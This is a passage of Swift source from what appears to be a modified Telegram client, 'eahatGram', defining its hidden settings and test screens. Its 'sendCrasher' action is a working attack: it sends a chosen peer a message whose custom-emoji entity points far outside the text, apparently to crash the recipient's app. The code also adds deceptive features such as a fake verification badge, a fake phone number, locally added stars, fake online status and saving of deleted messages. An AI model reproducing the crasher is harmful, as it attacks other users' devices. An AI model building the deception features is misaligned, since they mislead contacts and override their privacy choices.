        case .disableLanguageRecognition:
            return state.functestDisableLanguageRecognitionEnabled
        case .disableReloginTokens:
            return state.functestDisableReloginTokensEnabled
        }
    }

    func update(state: inout EahatGramState, value: Bool) {
        switch self {
        case .skipReadHistory:
            state.functestSkipReadHistoryEnabled = value
        case .alwaysDisplayTyping:
            state.functestAlwaysDisplayTypingEnabled = value
        case .enablePWA:
            state.functestEnablePWAEnabled = value
        case .disableImageContentAnalysis:
            state.functestDisableImageContentAnalysisEnabled = value
        case .storiesJpegExperiment:
            state.functestStoriesJpegExperimentEnabled = value
        case .disableCallV2:
            state.functestDisableCallV2Enabled = value
        case .enableVoipTcp:
            state.functestEnableVoipTcpEnabled = value
        case .playerV2:
            state.functestPlayerV2Enabled = value
        case .disableLanguageRecognition:
            state.functestDisableLanguageRecognitionEnabled = value
        case .disableReloginTokens:
            state.functestDisableReloginTokensEnabled = value
        }
    }

    func update(settings: inout ExperimentalUISettings, value: Bool) {
        switch self {
        case .skipReadHistory:
            settings.skipReadHistory = value
        case .alwaysDisplayTyping:
            settings.alwaysDisplayTyping = value
        case .enablePWA:
            settings.enablePWA = value
        case .disableImageContentAnalysis:
            settings.disableImageContentAnalysis = value
        case .storiesJpegExperiment:
            settings.storiesJpegExperiment = value
        case .disableCallV2:
            settings.disableCallV2 = value
        case .enableVoipTcp:
            settings.enableVoipTcp = value
        case .playerV2:
            settings.playerV2 = value
        case .disableLanguageRecognition:
            settings.disableLanguageRecognition = value
        case .disableReloginTokens:
            settings.disableReloginTokens = value
        }
    }
}

private func eahatGramEntries(
    state: EahatGramState,
    presentationData: PresentationData,
    gifts: [ProfileGiftsContext.State.StarGift],
    farmJobs: [EahatGramFarmJob],
    noGiftsText: String,
    hasStarsContext: Bool
) -> [EahatGramEntry] {
    let maxVisibleGifts = 200
    let visibleGiftCount = min(gifts.count, maxVisibleGifts)
    var entries: [EahatGramEntry] = []

    switch state.selectedTab {
    case .me:
        entries.append(.addGiftToProfile)
        entries.append(.addCustomGiftToProfile)
        entries.append(.clearGifts)
        entries.append(.removeAllContacts)
        entries.append(.removeAllCalls)
        entries.append(.nftUsernameTag(state.nftUsernameTagText))
        entries.append(.nftUsernamePrice(state.nftUsernamePriceText))
        entries.append(.addNftUsernameTag)
        entries.append(.fakePhoneNumber(state.fakePhoneNumberText))
        entries.append(.fakeRate(state.fakeRateEnabled))
        if state.fakeRateEnabled {
            entries.append(.fakeRateLevel(state.fakeRateLevelText))
        }
        entries.append(.fakeVerify(state.fakeVerifyEnabled))
        entries.append(.starsAmount(state.starsAmount))
        entries.append(.addStars)
        if !hasStarsContext {
            entries.append(.starsStatus("starsContext=nil"))
        }
        entries.append(.targetHud(state.targetHudEnabled))
        entries.append(.liquidGlass(state.liquidGlassEnabled))
        entries.append(.replyQuote(state.replyQuoteEnabled))
        entries.append(.ghostMode(state.ghostModeEnabled))
        entries.append(.fakeOnline(state.fakeOnlineEnabled))
        entries.append(.fakeOnlineBackground(state.fakeOnlineBackgroundEnabled))
        entries.append(.saveDeletedMessages(state.saveDeletedMessagesEnabled))
        entries.append(.saveEditedMessages(state.saveEditedMessagesEnabled))
        entries.append(.noLags(state.noLagsEnabled))
        entries.append(.bogatiUi(state.bogatiUiEnabled))
        entries.append(.noWarning(state.hideFailedWarningEnabled))
        entries.append(.sendMode(state.sendModeEnabled))
        entries.append(.translator(state.translatorEnabled))
        entries.append(.translatorLanguage(eahatGramTranslationLanguageLabel(presentationData.strings, languageCode: state.translatorLanguageCode)))
        entries.append(.translateMyMessages(state.translateMyMessagesEnabled))
        entries.append(.translateMyMessagesLanguage(eahatGramTranslationLanguageLabel(presentationData.strings, languageCode: state.translateMyMessagesLanguageCode)))
        entries.append(.downFolder(state.downFolderEnabled))
        entries.append(.customUiTheme)
        entries.append(.viewUnread2Read(state.viewUnread2ReadEnabled))
            entries.append(.voiceMod(state.voiceModEnabled))
            if state.voiceModEnabled {
                entries.append(.voiceModV2(state.voiceModV2Enabled))
                if state.voiceModV2Enabled {
                    entries.append(.voiceModV2Voice(state.voiceModV2Voice))
                } else {
                    entries.append(.voiceModPreset(state.voiceModPreset))
                }
            }
            if gifts.isEmpty {
            entries.append(.noGifts(noGiftsText))
        } else {
            entries.append(.giftsSummary("Loaded gifts: \(gifts.count)"))
        }
    case .test:
        entries.append(.selectPeer(state.selectedPeerTitle.isEmpty ? "Not selected" : state.selectedPeerTitle))
        entries.append(.crasher)
        entries.append(.crasherDirect)
        entries.append(.useDirectRpc(state.useDirectRpc))
        entries.append(.refreshResponses)

        if gifts.isEmpty {
            entries.append(.noGifts(noGiftsText))
        } else {
            if gifts.count > visibleGiftCount {
                entries.append(.giftsSummary("Showing first \(visibleGiftCount) of \(gifts.count) gifts"))
            }
            for i in 0 ..< visibleGiftCount {
                entries.append(.testGift(i, eahatGramGiftTitle(gifts[i])))
                entries.append(.testGiftInfo(i, eahatGramGiftInfo(gifts[i])))
            }
        }

        if state.responses.isEmpty {
            entries.append(.noResponses("No saved server responses"))
        } else {
            for i in 0 ..< state.responses.count {
                entries.append(.response(i, state.responses[i]))
            }
        }
    case .chain:
        entries.append(.chainPeerId(state.chainPeerIdText))
        entries.append(.chainDepth(state.chainDepthText))
        entries.append(.chainPeerLimit(state.chainPeerLimitText))
        entries.append(.chainWorkerCount(state.chainWorkerCountText))
        if state.hasCurrentChainVisualization {
            entries.append(.openCurrentChainVisualization)
        }
        entries.append(.runChainScan)
        entries.append(.chainStatus(state.chainStatusText))
    case .ai:
        entries.append(.aiAssistantEnabled(state.aiAssistantEnabled))
        entries.append(.aiAssistantPeer(state.aiAssistantPeerTitle.isEmpty ? "Not selected" : state.aiAssistantPeerTitle))
        entries.append(.aiAssistantTargetPeer(state.aiAssistantTargetPeerEnabled))
        if state.aiAssistantTargetPeerEnabled {
            entries.append(.aiAssistantTargetPeerId(state.aiAssistantTargetPeerIdText))
        }
        entries.append(.aiAssistantStatus(state.aiAssistantStatusText))
    case .farm:
        entries.append(.farmBackground(state.farmBackgroundEnabled))
        entries.append(.farmBotUsername(state.farmBotUsernameText))
        entries.append(.farmCommand(state.farmCommandText))
        entries.append(.farmInterval(state.farmIntervalText))
        entries.append(.addFarmJob)
        if farmJobs.isEmpty {
            entries.append(.farmJobInfo(-1, "No farm jobs"))
        } else {
            for i in 0 ..< farmJobs.count {
                let job = farmJobs[i]
                entries.append(.farmJobEnabled(i, "@\(job.botUsername)", job.isEnabled))
                entries.append(.farmJobInfo(i, eahatGramFarmJobInfo(job)))
                entries.append(.removeFarmJob(i, "Delete @\(job.botUsername)"))
            }
        }
    case .functest:
        entries.append(.functestInfo("10 runtime-backed ExperimentalUISettings switches. Each toggle writes a real boolean flag that is already read by existing code paths."))
        for toggle in EahatGramFunctestToggle.allCases {
            entries.append(.functestToggle(toggle.rawValue, toggle.title, toggle.value(state: state)))
        }
    case .walpaper:
        entries.append(.wallpaperInfo("Custom global chat wallpaper picker. Supports photo and video files through local eahatGram wallpaper storage."))
        entries.append(.openWallpaperPicker)
    }

    entries.sort()
    var uniqueEntries: [EahatGramEntry] = []
    var seenStableIds = Set<Int>()
    uniqueEntries.reserveCapacity(entries.count)
    for entry in entries {
        if seenStableIds.insert(entry.stableId).inserted {
            uniqueEntries.append(entry)
        }
    }
    return uniqueEntries
}

private func eahatGramScreen(context: AccountContext, starsContext: StarsContext?, profileGiftsContext: ProfileGiftsContext?) -> ViewController {
    let initialState = EahatGramState(
        liquidGlassEnabled: context.sharedContext.immediateExperimentalUISettings.fakeGlass,
        replyQuoteEnabled: context.sharedContext.immediateExperimentalUISettings.replyQuote,
        ghostModeEnabled: context.sharedContext.immediateExperimentalUISettings.ghostMode,
        fakeOnlineEnabled: context.sharedContext.immediateExperimentalUISettings.fakeOnline,
        fakeOnlineBackgroundEnabled: context.sharedContext.immediateExperimentalUISettings.fakeOnlineBackgroundEnabled,
        saveDeletedMessagesEnabled: context.sharedContext.immediateExperimentalUISettings.saveDeletedMessages,
        saveEditedMessagesEnabled: context.sharedContext.immediateExperimentalUISettings.saveEditedMessages,
        noLagsEnabled: context.sharedContext.immediateExperimentalUISettings.noLagsEnabled,
        viewUnread2ReadEnabled: context.sharedContext.immediateExperimentalUISettings.viewUnread2Read,
        hasCurrentChainVisualization: eahatGramPersistedChainVisualizationState.with { $0 != nil },
        experimentalSettings: context.sharedContext.immediateExperimentalUISettings
    )
    let statePromise = ValuePromise(initialState, ignoreRepeated: true)
    let stateValue = Atomic(value: initialState)
    let giftsPromise = ValuePromise([ProfileGiftsContext.State.StarGift](), ignoreRepeated: true)
    let currentGifts = Atomic(value: [ProfileGiftsContext.State.StarGift]())
    EahatGramFarmManager.shared.updatePrimaryContext(context)
    EahatGramAiAutoReplyManager.shared.updatePrimaryContext(context)
    let currentFarmJobs = Atomic(value: EahatGramFarmManager.shared.jobsSnapshot())
    let probeDisposable = MetaDisposable()
    let chainBuildDisposable = MetaDisposable()
    let chainBuildGeneration = Atomic(value: 0)
    let chainVisualizationState = Atomic<EahatGramGiftChainVisualizationState?>(value: nil)
    let profileGiftsContextStateDisposable = MetaDisposable()
    let profileGiftsContextRef = Atomic<ProfileGiftsContext?>(value: profileGiftsContext)
    let removeContactsDisposable = MetaDisposable()
    let removeCallsDisposable = MetaDisposable()

    let updateState: ((EahatGramState) -> EahatGramState) -> Void = { f in
        statePromise.set(stateValue.modify { f($0) })
    }

    let setChainStatus: (String) -> Void = { text in
        updateState { current in
            var current = current
            current.chainStatusText = text
            return current
        }
    }

    let setCurrentChainVisualizationState: (EahatGramGiftChainVisualizationState?) -> Void = { visualizationState in
        _ = eahatGramPersistedChainVisualizationState.swap(visualizationState)
        _ = chainVisualizationState.swap(visualizationState)
        updateState { current in
            var current = current
            current.hasCurrentChainVisualization = visualizationState != nil
            return current
        }
    }

    let appendResponse: (String) -> Void = { response in
        Logger.shared.log("eahatGram", response)
        Logger.shared.shortLog("eahatGram", "[eahatGram] \(response)")
        updateState { current in
            var current = current
            current.responses = [response] + current.responses
            if current.responses.count > 20 {
                current.responses.removeSubrange(20 ..< current.responses.count)
            }
            return current
        }
    }

    let refreshResponses: () -> Void = {
        let _ = (Logger.shared.collectShortLog()
        |> deliverOnMainQueue).start(next: { events in
            let filtered = events.compactMap { _, text -> String? in
                if text.contains("[StarGiftProbe]") || text.contains("[eahatGram]") {
                    return text
                } else {
                    return nil
                }
            }
            updateState { current in
                var current = current
                current.responses = Array(filtered.prefix(20))
                return current
            }
        })
    }

    let bindProfileGiftsContext: (ProfileGiftsContext) -> Void = { currentProfileGiftsContext in
        profileGiftsContextStateDisposable.set((currentProfileGiftsContext.state
        |> deliverOnMainQueue).start(next: { giftsState in
            let gifts = giftsState.gifts
            giftsPromise.set(gifts)
            _ = currentGifts.swap(gifts)
        }))
    }
    if let profileGiftsContext {
        bindProfileGiftsContext(profileGiftsContext)
    }

    let ensureProfileGiftsContext: () -> ProfileGiftsContext = {
        if let current = profileGiftsContextRef.with({ $0 }) {
            return current
        }
        let created = ProfileGiftsContext(account: context.account, peerId: context.account.peerId, filter: .All)
        _ = profileGiftsContextRef.swap(created)
        bindProfileGiftsContext(created)
        return created
    }

    var pushControllerImpl: ((ViewController) -> Void)?
    var presentControllerImpl: ((ViewController) -> Void)?
    var openCurrentChainVisualizationImpl: (() -> Void)?

    let arguments = EahatGramArguments(
        context: context,
        selectPeer: {
            let controller = context.sharedContext.makePeerSelectionController(PeerSelectionControllerParams(context: context, filter: [.onlyWriteable, .excludeDisabled]))
            controller.peerSelected = { peer, _ in
                updateState { current in
                    var current = current
                    current.selectedPeerId = peer.id
                    current.selectedPeerTitle = peer.compactDisplayTitle
                    if peer.id.namespace == Namespaces.Peer.CloudUser {
                        current.chainPeerIdText = "\(peer.id.id._internalGetInt64Value())"
                    }
                    return current
                }
                controller.dismiss()
            }
            pushControllerImpl?(controller)
        },
        sendCrasher: {
            let currentState = stateValue.with { $0 }
            guard let targetPeerId = currentState.selectedPeerId else {
                appendResponse("crasher failed reason=NO_PEER_SELECTED")
                return
            }
            
            // Create malformed custom emoji entity with out-of-bounds range
            let messageText = "test"
            let malformedOffset = 1000
            let malformedLength = 100
            
            let message: EnqueueMessage = .message(
                text: messageText,
                attributes: [
                    TextEntitiesMessageAttribute(entities: [
                        MessageTextEntity(
                            range: malformedOffset ..< (malformedOffset + malformedLength),
                            type: .CustomEmoji(stickerPack: nil, fileId: 5377305978079288312)
                        )
                    ])
                ],
                inlineStickers: [:],
                mediaReference: nil,
                threadId: nil,
                replyToMessageId: nil,
                replyToStoryId: nil,
                localGroupingKey: nil,
                correlationId: nil,
                bubbleUpEmojiOrStickersets: []
            )
            
            appendResponse("crasher sending to peerId=\(targetPeerId.toInt64()) offset=\(malformedOffset) length=\(malformedLength) textLen=\(messageText.count)")
            
            let _ = (enqueueMessages(account: context.account, peerId: targetPeerId, messages: [message])
            |> deliverOnMainQueue).start(next: { messageIds in
                let hasMessageId = messageIds.contains(where: { $0 != nil })
                if hasMessageId {
                    if let firstId = messageIds.first, let messageId = firstId {
                        appendResponse("crasher enqueued messageId=\(messageId.id) namespace=\(messageId.namespace) peerId=\(messageId.peerId.toInt64())")
                    } else {
                        appendResponse("crasher enqueued hasMessageId=true but first is nil")
                    }
                } else {
                    appendResponse("crasher enqueued but all messageIds are nil")
                }
            }, completed: {
                appendResponse("crasher signal completed")
            })
        },
        sendCrasherDirect: {
            appendResponse("crasherDirect disabled reason=OFFENSIVE_PATH_REMOVED")
        },
        addGiftToProfile: {
            let controller = eahatGramAddGiftToProfileScreen(
                context: context,
                profileGiftsContext: ensureProfileGiftsContext(),
                appendStatus: appendResponse
            )
            pushControllerImpl?(controller)
        },
        addCustomGiftToProfile: {
            let controller = eahatGramAddGiftToProfileScreen(
                context: context,
                profileGiftsContext: ensureProfileGiftsContext(),
                appendStatus: appendResponse,
                customMode: true
            )
            pushControllerImpl?(controller)
        },
        clearGifts: {
            ensureProfileGiftsContext().clearLocalInsertedStarGifts()
            appendResponse("clearLocalInsertedStarGifts completed")
        },
        removeAllContacts: {
            let _ = context.engine.contacts.updateIsContactSynchronizationEnabled(isContactSynchronizationEnabled: false).start()
            appendResponse("removeAllContacts started")
            removeContactsDisposable.set((context.engine.contacts.deleteAllContacts()
            |> deliverOnMainQueue).start(completed: {
                appendResponse("removeAllContacts completed")
            }))
        },
        removeAllCalls: {
            appendResponse("removeAllCalls started forEveryone=0")
            removeCallsDisposable.set((context.engine.messages.clearCallHistory(forEveryone: false)
            |> deliverOnMainQueue).start(error: { _ in
                appendResponse("removeAllCalls failed reason=CLEAR_CALL_HISTORY_ERROR")
            }, completed: {
                appendResponse("removeAllCalls completed")
            }))
        },
        updateNftUsernameTag: { value in
            let normalized = value.trimmingCharacters(in: .whitespacesAndNewlines)
            EahatGramDebugSettings.setNftUsernameTag(normalized)
            let currentPrice = EahatGramDebugSettings.nftUsernamePrice.with { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
            if normalized.isEmpty && currentPrice.isEmpty {
                EahatGramDebugSettings.setNftUsernamePurchaseDate(nil)
            } else {
                EahatGramDebugSettings.setNftUsernamePurchaseDate(Int32(Date().timeIntervalSince1970))
            }
            updateState { current in
                var current = current
                current.nftUsernameTagText = normalized
                return current
            }
            appendResponse("nftUsernameTag value=\(normalized)")
        },
        updateNftUsernamePrice: { value in
            let normalized = value.trimmingCharacters(in: .whitespacesAndNewlines)
            EahatGramDebugSettings.setNftUsernamePrice(normalized)
            let currentTag = EahatGramDebugSettings.nftUsernameTag.with { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
            if normalized.isEmpty && currentTag.isEmpty {
                EahatGramDebugSettings.setNftUsernamePurchaseDate(nil)
            } else {
                EahatGramDebugSettings.setNftUsernamePurchaseDate(Int32(Date().timeIntervalSince1970))
            }
            updateState { current in
                var current = current
                current.nftUsernamePriceText = normalized
                return current
            }
            appendResponse("nftUsernamePrice value=\(normalized)")
        },
        addNftUsernameTag: {
            let currentState = stateValue.with { $0 }
            let normalizedUsername = eahatGramNormalizedUsernameTag(currentState.nftUsernameTagText)
            let normalizedPriceText = eahatGramNormalizedNftPriceText(currentState.nftUsernamePriceText)
            guard !normalizedUsername.isEmpty else {
                appendResponse("addNftUsernameTag failed reason=USERNAME_EMPTY")
                return
            }
            let purchaseDate = Int32(Date().timeIntervalSince1970)
            let totalCount = EahatGramDebugSettings.appendNftUsernameTag(
                username: normalizedUsername,
                priceText: normalizedPriceText,
                purchaseDate: purchaseDate
            )
            EahatGramDebugSettings.setNftUsernameTag(normalizedUsername)
            EahatGramDebugSettings.setNftUsernamePrice(normalizedPriceText)
            EahatGramDebugSettings.setNftUsernamePurchaseDate(purchaseDate)
            appendResponse("addNftUsernameTag completed username=\(normalizedUsername) total=\(totalCount)")
        },
        updateFakePhoneNumber: { value in
            let normalized = eahatGramNormalizedNumericText(value, maxLength: 15)
            EahatGramDebugSettings.setFakePhoneNumber(normalized)
            updateState { current in
                var current = current
                current.fakePhoneNumberText = normalized
                return current
            }
            appendResponse("fakePhoneNumber value=\(normalized)")
        },
        updateFakeRateEnabled: { value in
            EahatGramDebugSettings.setFakeRateEnabled(value)
            updateState { current in
                var current = current
                current.fakeRateEnabled = value
                return current
            }
            appendResponse("fakeRate enabled=\(value)")
        },
        updateFakeRateLevel: { value in
            let normalized = eahatGramNormalizedNumericText(value, maxLength: 3)
            EahatGramDebugSettings.setFakeRateLevel(normalized)
            updateState { current in
                var current = current
                current.fakeRateLevelText = normalized
                return current
            }
            appendResponse("fakeRate level=\(normalized)")
        },
        updateFakeVerifyEnabled: { value in
            EahatGramDebugSettings.setFakeVerifyEnabled(value)
            updateState { current in
                var current = current
                current.fakeVerifyEnabled = value
                return current
            }
            appendResponse("fakeVerify enabled=\(value)")
        },
        openWallpaperPicker: {
            presentCustomWallpaperPicker(
                context: context,
                present: { controller in
                    presentControllerImpl?(controller)
                },
                push: { controller in
                    pushControllerImpl?(controller)
                }
            )
            appendResponse("wallpaperPicker opened")
        },
        updateStarsAmount: { value in
            updateState { current in
                var current = current
                current.starsAmount = min(100000, max(1, value))
                return current
            }
        },
        addStars: {
            guard let starsContext else {
                appendResponse("addStars failed reason=STARS_CONTEXT_NIL")
                return
            }
            let amount = stateValue.with { $0.starsAmount }
            starsContext.add(balance: StarsAmount(value: Int64(amount), nanos: 0), addTransaction: true)
            appendResponse("addStars completed amount=\(amount)")
        },
        updateTargetHudEnabled: { value in
            EahatGramDebugSettings.setTargetHudEnabled(value)
            updateState { current in
                var current = current
                current.targetHudEnabled = value
                return current
            }
            appendResponse("targetHud enabled=\(value)")
        },
        updateLiquidGlassEnabled: { value in
            let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                var settings = settings
                settings.fakeGlass = value
                if value {
                    settings.forceClearGlass = false
                }
                return settings
            }).start()
            GlassBackgroundView.useCustomGlassImpl = value
            updateState { current in
                var current = current
                current.liquidGlassEnabled = value
                return current
            }
            appendResponse("liquidGlass enabled=\(value)")
        },
        updateReplyQuoteEnabled: { value in
            let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                var settings = settings
                settings.replyQuote = value
                return settings
            }).start()
            updateState { current in
                var current = current
                current.replyQuoteEnabled = value
                return current
            }
            appendResponse("replyQuote enabled=\(value)")
        },
        updateGhostModeEnabled: { value in
            let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                var settings = settings
                settings.ghostMode = value
                settings.skipReadHistory = value
                return settings
            }).start()
            updateState { current in
                var current = current
                current.ghostModeEnabled = value
                return current
            }
            appendResponse("ghostMode enabled=\(value)")
        },
        updateFakeOnlineEnabled: { value in
            let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                var settings = settings
                settings.fakeOnline = value
                return settings
            }).start()
            updateState { current in
                var current = current
                current.fakeOnlineEnabled = value
                return current
            }
            appendResponse("fakeOnline enabled=\(value)")
        },
        updateFakeOnlineBackgroundEnabled: { value in
            let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                var settings = settings
                settings.fakeOnlineBackgroundEnabled = value
                return settings
            }).start()
            updateState { current in
                var current = current
                current.fakeOnlineBackgroundEnabled = value
                return current
            }
            appendResponse("fakeOnlineBackground enabled=\(value)")
        },
        updateSaveDeletedMessagesEnabled: { value in
            let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                var settings = settings
                settings.saveDeletedMessages = value
                return settings
            }).start()
            updateState { current in
                var current = current
                current.saveDeletedMessagesEnabled = value
                return current
            }
            appendResponse("saveDeletedMessages enabled=\(value)")
        },
        updateSaveEditedMessagesEnabled: { value in
            let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                var settings = settings
                settings.saveEditedMessages = value
                return settings
            }).start()
            updateState { current in
                var current = current
                current.saveEditedMessagesEnabled = value
                return current
            }
            appendResponse("saveEditedMessages enabled=\(value)")
        },
        updateNoLagsEnabled: { value in
            let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                var settings = settings
                settings.noLagsEnabled = value
                settings.disableBackgroundAnimation = value
                settings.forceClearGlass = value
                if value {
                    settings.fakeGlass = false
                    settings.bogatiUiEnabled = false
                }
                return settings
            }).start()
            if value {
                let _ = updateMediaDownloadSettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                    var settings = settings
                    settings.downloadInBackground = false
                    settings.energyUsageSettings = EnergyUsageSettings.powerSavingDefault
                    return settings
                }).start()
                GlassBackgroundView.useCustomGlassImpl = false
            }
            updateState { current in
                var current = current
                current.noLagsEnabled = value
                if value {
                    current.bogatiUiEnabled = false
                    current.liquidGlassEnabled = false
                }
                return current
            }
            appendResponse("noLags enabled=\(value)")
        },
        updateBogatiUiEnabled: { value in
            let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                var settings = settings
                settings.bogatiUiEnabled = value
                if value {
                    settings.noLagsEnabled = false
                }
                return settings
            }).start()
            updateState { current in
                var current = current
                current.bogatiUiEnabled = value
                if value {
                    current.noLagsEnabled = false
                }
                return current
            }
            appendResponse("bogatiUi enabled=\(value)")
        },
        updateHideFailedWarningEnabled: { value in
            let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                var settings = settings
                settings.hideFailedWarning = value
                return settings
            }).start()
            updateState { current in
                var current = current
                current.hideFailedWarningEnabled = value
                return current
            }
            appendResponse("hideFailedWarning enabled=\(value)")
        },
        updateSendModeEnabled: { value in
            let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                var settings = settings
                settings.sendMode = value
                return settings
            }).start()
            updateState { current in
                var current = current
                current.sendModeEnabled = value
                return current
            }
            appendResponse("sendMode enabled=\(value)")
        },
        updateTranslatorEnabled: { value in
            let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                var settings = settings
                settings.eahatGramTranslatorEnabled = value
                return settings
            }).start()
            updateState { current in
                var current = current
                current.translatorEnabled = value
                return current
            }
            appendResponse("translator enabled=\(value)")
        },
        selectTranslatorLanguage: {
            let presentationData = context.sharedContext.currentPresentationData.with { $0 }
            let baseLanguageCode = eahatGramBaseTranslationLanguageCode(presentationData.strings)
            let currentLanguageCode = stateValue.with { $0.translatorLanguageCode } ?? baseLanguageCode
            let controller = languageSelectionController(
                context: context,
                fromLanguage: baseLanguageCode,
                toLanguage: currentLanguageCode,
                completion: { _, toLanguage in
                    let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                        var settings = settings
                        settings.eahatGramTranslatorLanguage = normalizeTranslationLanguage(toLanguage)
                        return settings
                    }).start()
                    updateState { current in
                        var current = current
                        current.translatorLanguageCode = normalizeTranslationLanguage(toLanguage)
                        return current
                    }
                    appendResponse("translator language=\(normalizeTranslationLanguage(toLanguage))")
                }
            )
            pushControllerImpl?(controller)
            appendResponse("translatorLanguage selector opened")
        },
        updateTranslateMyMessagesEnabled: { value in
            let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                var settings = settings
                settings.eahatGramTranslateMyMessagesEnabled = value
                return settings
            }).start()
            updateState { current in
                var current = current
                current.translateMyMessagesEnabled = value
                return current
            }
            appendResponse("translateMyMessages enabled=\(value)")
        },
        selectTranslateMyMessagesLanguage: {
            let presentationData = context.sharedContext.currentPresentationData.with { $0 }
            let baseLanguageCode = eahatGramBaseTranslationLanguageCode(presentationData.strings)
            let currentLanguageCode = stateValue.with { $0.translateMyMessagesLanguageCode } ?? baseLanguageCode
            let controller = languageSelectionController(
                context: context,
                fromLanguage: baseLanguageCode,
                toLanguage: currentLanguageCode,
                completion: { _, toLanguage in
                    let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                        var settings = settings
                        settings.eahatGramTranslateMyMessagesLanguage = normalizeTranslationLanguage(toLanguage)
                        return settings
                    }).start()
                    updateState { current in
                        var current = current
                        current.translateMyMessagesLanguageCode = normalizeTranslationLanguage(toLanguage)
                        return current
                    }
                    appendResponse("translateMyMessages language=\(normalizeTranslationLanguage(toLanguage))")
                }
            )
            pushControllerImpl?(controller)
            appendResponse("translateMyMessagesLanguage selector opened")
        },
        updateAiAssistantEnabled: { value in
            let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                var settings = settings
                settings.eahatGramAiAssistantEnabled = value
                return settings
            }).start(completed: {
                EahatGramAiAutoReplyManager.shared.updatePrimaryContext(context)
            })
            updateState { current in
                var current = current
                current.aiAssistantEnabled = value
                current.aiAssistantStatusText = value ? "Auto replies enabled" : "Auto replies disabled"
                return current
            }
            appendResponse("aiAssistant enabled=\(value)")
        },
        selectAiAssistantPeer: {
            let controller = context.sharedContext.makePeerSelectionController(PeerSelectionControllerParams(context: context, filter: [.onlyWriteable, .excludeDisabled]))
            controller.peerSelected = { peer, _ in
                let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                    var settings = settings
                    settings.eahatGramAiAssistantChatPeerId = peer.id.toInt64()
                    return settings
                }).start(completed: {
                    EahatGramAiAutoReplyManager.shared.updatePrimaryContext(context)
                })
                updateState { current in
                    var current = current
                    current.aiAssistantPeerId = peer.id
                    current.aiAssistantPeerTitle = peer.compactDisplayTitle
                    current.aiAssistantStatusText = "AI chat selected peerId=\(peer.id.toInt64())"
                    return current
                }
                appendResponse("aiAssistant peerId=\(peer.id.toInt64()) title=\(peer.compactDisplayTitle)")
                controller.dismiss()
            }
            pushControllerImpl?(controller)
        },
        updateAiAssistantTargetPeerEnabled: { value in
            let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                var settings = settings
                settings.eahatGramAiAssistantTargetPeerEnabled = value
                return settings
            }).start(completed: {
                EahatGramAiAutoReplyManager.shared.refresh()
            })
            updateState { current in
                var current = current
                current.aiAssistantTargetPeerEnabled = value
                current.aiAssistantStatusText = "Target peer enabled=\(value)"
                return current
            }
            appendResponse("aiAssistant targetPeer enabled=\(value)")
        },
        updateAiAssistantTargetPeerId: { value in
            let normalized = eahatGramNormalizedNumericText(value, maxLength: 18)
            let parsedPeerId = Int64(normalized).flatMap { value -> Int64? in
                return value > 0 ? value : nil
            }
            let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                var settings = settings
                settings.eahatGramAiAssistantTargetPeerId = parsedPeerId
                return settings
            }).start(completed: {
                EahatGramAiAutoReplyManager.shared.refresh()
            })
            updateState { current in
                var current = current
                current.aiAssistantTargetPeerIdText = normalized
                current.aiAssistantStatusText = parsedPeerId.map { "Target peerId=\($0)" } ?? "Target peerId=nil"
                return current
            }
            appendResponse(parsedPeerId.map { "aiAssistant targetPeerId=\($0)" } ?? "aiAssistant targetPeerId=nil")
        },
        updateDownFolderEnabled: { value in
            let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                var settings = settings
                settings.foldersTabAtBottom = value
                return settings
            }).start()
            updateState { current in
                var current = current
                current.downFolderEnabled = value
                return current
            }
            appendResponse("downFolder enabled=\(value)")
        },
        openCustomUiTheme: {
            let controller = context.sharedContext.makeChatListController(
                context: context,
                location: .chatList(groupId: EngineChatList.Group(.root)),
                controlsHistoryPreload: false,
                hideNetworkActivityStatus: false,
                previewing: false,
                enableDebugActions: false
            )
            _ = controller.view
            eahatGramRequestChatListThemeEditMode()
            pushControllerImpl?(controller)
            appendResponse("customUiTheme opened")
        },
        updateViewUnread2ReadEnabled: { value in
            let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                var settings = settings
                settings.viewUnread2Read = value
                return settings
            }).start()
            updateState { current in
                var current = current
                current.viewUnread2ReadEnabled = value
                return current
            }
            appendResponse("viewUnread2Read enabled=\(value)")
        },
        updateFarmBotUsername: { value in
            let normalized = eahatGramNormalizedFarmUsername(value)
            updateState { current in
                var current = current
                current.farmBotUsernameText = normalized
                return current
            }
        },
        updateFarmCommand: { value in
            updateState { current in
                var current = current
                current.farmCommandText = value
                return current
            }
        },
        updateFarmInterval: { value in
            let normalized = eahatGramNormalizedNumericText(value, maxLength: 5)
            updateState { current in
                var current = current
                current.farmIntervalText = normalized
                return current
            }
        },
        updateFarmBackgroundEnabled: { value in
            let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                var settings = settings
                settings.farmBackgroundEnabled = value
                return settings
            }).start()
            updateState { current in
                var current = current
                current.farmBackgroundEnabled = value
                return current
            }
